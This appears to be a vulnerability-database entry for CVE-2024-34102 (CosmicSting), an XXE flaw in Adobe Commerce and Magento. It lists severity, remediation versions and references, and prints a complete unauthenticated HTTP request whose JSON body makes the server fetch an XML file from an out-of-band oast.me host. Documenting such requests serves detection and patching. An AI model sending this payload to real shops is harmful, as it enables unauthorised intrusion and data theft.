---
layout: post
cve_id: CVE-2024-34102
title: Adobe Commerce & Magento - CosmicSting
pcap: true
pcap_path: /pcaps/2024/CVE-2024-34102.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-34102.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: critical
impact: 'Unauthenticated attackers can exploit XXE to achieve arbitrary code execution
  on Adobe Commerce and Magento instances.

  '
remediation: 'Update Adobe Commerce to version 2.4.7-p1, 2.4.6-p6, 2.4.5-p8, 2.4.4-p9
  or later.

  '
reference:
- https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md
- https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-34102
  cwe-id: CWE-611
  epss-score: 0.94101
  epss-percentile: 0.99902
  cpe: cpe:2.3:a:adobe:magento:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  fofa-query: app="Adobe-Magento"
  product: magento
  vendor: adobe
tags:
- cve
- cve2024
- adobe
- magento
- xxe
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Adobe Commerce versions 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8 and earlier are affected by an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could result in arbitrary code execution.


## üåê HTTP Request
```nohighlight
POST /rest/V1/guest-carts/1/estimate-shipping-methods HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Content-Length: 187
Content-Type: application/json
Accept-Encoding: gzip
{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://d5jjm6hle0o4fg7gk49g1t51cdxebjmcc.oast.me/xxe.xml","dataIsURL":true,"options":12345678}}}}}}
```

